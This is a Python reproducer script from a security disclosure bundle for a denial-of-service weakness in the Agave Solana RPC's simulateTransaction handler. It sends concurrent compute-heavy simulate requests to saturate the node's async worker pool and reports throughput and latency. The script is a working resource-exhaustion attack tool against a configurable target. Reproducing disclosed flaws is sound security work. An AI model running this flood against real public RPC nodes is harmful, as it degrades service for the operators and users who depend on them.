#!/usr/bin/env python3
"""SOL_F14 reproducer — simulateTransaction sync-handler-in-async-runtime wedge.

Standalone reproducer for the SOL_F14 finding in the NullRabbit
2026-04-30 Agave RPC disclosure bundle. Builds CU-heavy transactions
against pre-loaded programs (ComputeBudget + SPL Memo v2) — no
custom BPF deploy required.

Target: agave v3.1.9, commit 765ee54adc4f574b1cd4f03a5500bf46c0af0817
Tested against: solana-test-validator 2.2.16

Dependencies:
  python3 -m pip install solders   # >= 0.18

Mechanism: simulateTransaction is implemented as a synchronous handler
inside the async (Tokio) RPC runtime. Each in-flight simulate request
occupies a Tokio executor thread for the full sim duration; concurrent
requests saturate the runtime's worker pool. The path is also
unauthenticated and effectively gas-free (sigVerify defaults to false,
no RPC-tier compute-budget enforcement, the only CU limit is the
on-chain compute_unit_limit instruction's value, set by the attacker).

Headline measurements:
    1-thread aggregate req/s : 918.7
    8-worker aggregate req/s : 1,036.5  (1.13× scaling vs ideal 8×)
    8-worker per-worker req/s: 129.6     (7.1× drop vs single-thread)
    8-worker p50 latency     : 7.66 ms   (7.5× rise vs single-thread)

Reproducing the headline finding (the 7.1× per-worker drop) requires
running the reproducer twice — once at --workers 1 to establish the
single-thread baseline, then again at --workers 8 to demonstrate the
saturation. Compare per-worker req/s between the two runs:

    --workers 1  (baseline)         : ~918 req/s aggregate
    --workers 8  (default, headline): ~1,036 req/s aggregate
                                       (~129 req/s per worker → 7.1× drop)

The 1.13× scaling under 8× concurrency is the signature: throughput
stalls at the Tokio executor pool limit while per-worker latency
rises proportionally. A single-worker run shows the simulate path
engages but does NOT reproduce the architectural finding — only the
1-vs-8 comparison surfaces the per-worker drop.

Source citations (agave v3.1.9 / 765ee54):
    rpc/src/rpc.rs:3502-3508    trait simulate_transaction (sync)
    rpc/src/rpc.rs:3943-3949    impl simulate_transaction header (sync)
    rpc/src/rpc.rs:4009         bank.simulate_transaction direct call
                                (no spawn_blocking interposed)
    runtime/src/bank.rs:3066-3074
                                pub fn simulate_transaction (sync wrapper)
    runtime/src/bank.rs:3078-3093
                                simulate_transaction_unchecked →
                                load_and_execute_transactions runs the
                                BPF VM on the calling Tokio worker

Note on transaction construction:
    The reproducer uses pre-loaded programs (ComputeBudget v3 +
    SPL Memo v2) so a custom BPF compute-burn deploy is not required.
    Any sufficiently CU-heavy transaction reproduces the architectural
    pattern; the finding is at the simulate-handler layer, not in any
    specific bytecode. The pre-loaded approach also avoids an
    unrelated edition2024 cargo-build-sbf toolchain conflict that
    NullRabbit encountered during the original measurement cycle.

Usage:

    python3 SOL_F14_repro.py \\
        --target http://127.0.0.1:8899 \\
        --payer /path/to/funded-keypair.json \\
        --workers 8 --duration 10
"""

from __future__ import annotations

import argparse
import base64
import json
import statistics
import struct
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from http.client import HTTPConnection
from urllib.parse import urlparse, urlunparse

try:
    from solders.pubkey import Pubkey
    from solders.instruction import Instruction
    from solders.keypair import Keypair
    from solders.message import Message
    from solders.transaction import Transaction
    from solders.hash import Hash
except ImportError:
    print("ERROR: solders not installed. Run: pip install solders",
          file=sys.stderr)
    sys.exit(1)

import urllib.request

COMPUTE_BUDGET = Pubkey.from_string("ComputeBudget111111111111111111111111111111")
MEMO_V2 = Pubkey.from_string("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr")


def cb_set_unit_limit(units: int) -> Instruction:
    return Instruction(COMPUTE_BUDGET, bytes([0x02]) + struct.pack("<I", units), [])


def cb_set_unit_price(microlamports: int) -> Instruction:
    return Instruction(COMPUTE_BUDGET, bytes([0x03]) + struct.pack("<Q", microlamports), [])


def memo_ix(text: bytes) -> Instruction:
    return Instruction(MEMO_V2, text, [])


def get_blockhash(target_url: str, timeout: float = 10.0) -> Hash:
    req = urllib.request.Request(
        target_url,
        data=json.dumps({
            "jsonrpc": "2.0", "id": 1, "method": "getLatestBlockhash",
        }).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return Hash.from_string(json.loads(r.read())["result"]["value"]["blockhash"])


def build_tx(payer: Keypair, blockhash: Hash, n_memos: int, cu_limit: int) -> Transaction:
    ixs = [cb_set_unit_limit(cu_limit), cb_set_unit_price(1)]
    for i in range(n_memos):
        ixs.append(memo_ix(b"F14-" + str(i).encode().ljust(8, b".")))
    msg = Message.new_with_blockhash(ixs, payer.pubkey(), blockhash)
    return Transaction.new_unsigned(msg)


def build_body(tx_b64: str) -> bytes:
    return json.dumps({
        "jsonrpc": "2.0", "id": 1,
        "method": "simulateTransaction",
        "params": [tx_b64, {
            "sigVerify": False,
            "encoding": "base64",
            "replaceRecentBlockhash": True,
        }],
    }).encode()


def send_one(host: str, port: int, body: bytes, timeout: float):
    t0 = time.monotonic()
    status = None
    resp_bytes = 0
    sim_err = "unknown"
    units_consumed = 0
    try:
        conn = HTTPConnection(host, port, timeout=timeout)
        conn.request("POST", "/", body, {
            "Content-Type": "application/json",
            "Content-Length": str(len(body)),
        })
        resp = conn.getresponse()
        body_resp = resp.read()
        status = resp.status
        resp_bytes = len(body_resp)
        try:
            v = json.loads(body_resp).get("result", {}).get("value", {})
            units_consumed = v.get("unitsConsumed", 0) or 0
            sim_err = "ok" if v.get("err") is None else "exec_err"
        except Exception:
            sim_err = "parse_err"
        conn.close()
    except Exception as e:
        print(f"  request error: {e}", file=sys.stderr)
        sim_err = "rpc_err"
    return status, resp_bytes, int((time.monotonic() - t0) * 1e9), sim_err, units_consumed


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--target", default="http://127.0.0.1:8899")
    ap.add_argument("--payer", required=True,
                    help="Path to funded payer keypair JSON. Account must "
                         "exist on-chain (the bank loads the fee-payer even "
                         "with sigVerify=false).")
    ap.add_argument("--workers", type=int, default=8)
    ap.add_argument("--duration", type=float, default=10.0)
    ap.add_argument("--n-memos", type=int, default=40,
                    help="memo instructions per tx — controls per-request CU work")
    ap.add_argument("--cu-limit", type=int, default=1_400_000)
    ap.add_argument("--timeout", type=float, default=30.0)
    args = ap.parse_args()

    u = urlparse(args.target)
    host, port = u.hostname, u.port or 8899

    with open(args.payer) as f:
        payer = Keypair.from_bytes(bytes(json.load(f)))
    print(f"SOL_F14 reproducer — agave v3.1.9 / 765ee54")
    print(f"target            : {host}:{port}")
    print(f"payer pubkey      : {payer.pubkey()}")
    print(f"workers           : {args.workers}")
    print(f"duration          : {args.duration}s")
    print(f"n_memos per tx    : {args.n_memos}")
    print(f"cu_limit per tx   : {args.cu_limit:,}")

    blockhash = get_blockhash(args.target)
    tx = build_tx(payer, blockhash, args.n_memos, args.cu_limit)
    body = build_body(base64.b64encode(bytes(tx)).decode())
    print(f"tx bytes          : {len(bytes(tx))}")
    print(f"request body bytes: {len(body)}")
    print()

    stop = threading.Event()
    results: list = []
    results_lock = threading.Lock()

    def worker_loop() -> int:
        n = 0
        while not stop.is_set():
            r = send_one(host, port, body, args.timeout)
            with results_lock:
                results.append(r)
            n += 1
        return n

    t_start = time.monotonic()
    deadline = t_start + args.duration
    with ThreadPoolExecutor(max_workers=args.workers) as pool:
        futures = [pool.submit(worker_loop) for _ in range(args.workers)]
        while time.monotonic() < deadline:
            time.sleep(0.1)
        stop.set()
        [f.result() for f in futures]
    elapsed = time.monotonic() - t_start

    n = len(results)
    if n == 0:
        print("No completed requests.", file=sys.stderr)
        return 1

    ok_count = sum(1 for s, _, _, e, _ in results if s == 200 and e == "ok")
    durs_ms = [d / 1e6 for _, _, d, _, _ in results]
    durs_ms.sort()
    cu_avg = statistics.mean([cu for _, _, _, _, cu in results if cu > 0])

    p50 = durs_ms[n // 2]
    p99 = durs_ms[min(n - 1, int(0.99 * n))]

    print(f"=== results ===")
    print(f"  total requests        : {n}")
    print(f"  sim ok                : {ok_count} ({ok_count/n*100:.1f}%)")
    print(f"  aggregate req/s       : {n/elapsed:.1f}")
    print(f"  per-worker req/s      : {n/elapsed/args.workers:.1f}")
    print(f"  CU consumed avg       : {cu_avg:,.0f} / {args.cu_limit:,}")
    print(f"  p50 latency           : {p50:.2f} ms")
    print(f"  p99 latency           : {p99:.2f} ms")
    print()
    print(f"Headline reference (1-thread vs 8-worker on solana-test-validator 2.2.16):")
    print(f"  1-thread aggregate    : 918.7 req/s, p50 1.02 ms, p99 2.01 ms")
    print(f"  8-worker aggregate    : 1,036.5 req/s (1.13× scaling)")
    print(f"  8-worker per-worker   : 129.6 req/s (7.1× drop)")
    print(f"  8-worker p50          : 7.66 ms (7.5× rise)")
    print(f"Throughput stalls at ~1.13× under 8× concurrency — the canonical")
    print(f"sync-handler-in-async-runtime saturation signature.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
